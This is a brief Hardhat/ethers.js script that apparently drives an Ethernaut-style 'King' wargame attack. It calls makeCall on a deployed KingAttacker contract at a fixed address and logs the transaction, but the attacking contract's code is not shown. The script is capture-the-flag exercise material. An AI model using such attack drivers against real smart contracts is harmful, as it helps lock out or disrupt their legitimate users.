const kingAttackerJson = require("../artifacts/contracts/9_KingAttacker.sol/KingAttacker.json");

const KING_ATTACKER_ADDRESS = "0xF45FcA393de4325E8cc14402Eb73DE21009D4A30";

async function main() {
  const [signer] = await ethers.getSigners();

  console.log("Executing with account:", signer.address);

  const weiAmount = (await signer.getBalance()).toString();
  
  console.log("Account balance:", (await ethers.utils.formatEther(weiAmount)));

  const forceAttackerContract = new ethers.Contract(KING_ATTACKER_ADDRESS, kingAttackerJson.abi, signer);

  const receipt = await forceAttackerContract.makeCall({ value: ethers.utils.parseEther('0') });

  const tx = await receipt.wait();

  console.log('tx', tx);

  console.log('done!')
}

main();